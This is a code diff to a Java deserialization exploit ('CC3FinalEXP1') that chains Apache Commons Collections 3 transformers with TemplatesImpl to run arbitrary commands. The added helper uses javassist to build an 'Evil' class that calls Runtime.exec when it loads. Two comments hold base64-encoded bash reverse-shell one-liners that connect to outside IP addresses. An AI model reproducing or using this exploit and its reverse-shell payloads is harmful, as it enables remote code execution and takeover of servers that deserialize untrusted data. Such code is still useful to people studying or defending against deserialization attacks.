@@ -1,6 +1,11 @@
+package CC3ysoEXP;
+
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtConstructor;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -31,13 +36,14 @@ public class CC3FinalEXP1 {
 
         Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
         bytecodesField.setAccessible(true);
-        byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));
+        // new String[]{\"/bin/bash\", \"-c\", \"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzkuMC4xNjQvMTIzNiAwPiYx}|{base64,-d}|{bash,-i}\"}"
+        byte[] evil = getTemplatesImpl("Calc");
         byte[][] codes = {evil};
         bytecodesField.set(templates,codes);
 
-        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
-        tfactoryField.setAccessible(true);
-        tfactoryField.set(templates, new TransformerFactoryImpl());
+//        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
+//        tfactoryField.setAccessible(true);
+//        tfactoryField.set(templates, new TransformerFactoryImpl());
         //    templates.newTransformer();
 
         InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},
@@ -72,5 +78,27 @@ public class CC3FinalEXP1 {
         ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
         Object obj = ois.readObject();
         return obj;
+    }
+
+    public static byte[] getTemplatesImpl(String cmd) {
+        try {
+            ClassPool pool = ClassPool.getDefault();
+            CtClass ctClass = pool.makeClass("Evil");
+            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
+            ctClass.setSuperclass(superClass);
+            CtConstructor constructor = ctClass.makeClassInitializer();
+            constructor.setBody(" try {\n" +
+                    " Runtime.getRuntime().exec(\"" + cmd +
+                    "\");\n" +
+                    " } catch (Exception ignored) {\n" +
+                    " }");
+            // "new String[]{\"/bin/bash\", \"-c\", \"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMC4xMS4yMzEvOTk5MCAwPiYx}|{base64,-d}|{bash,-i}\"}"
+            byte[] bytes = ctClass.toBytecode();
+            ctClass.defrost();
+            return bytes;
+        } catch (Exception e) {
+            e.printStackTrace();
+            return new byte[]{};
+        }
     }
 }
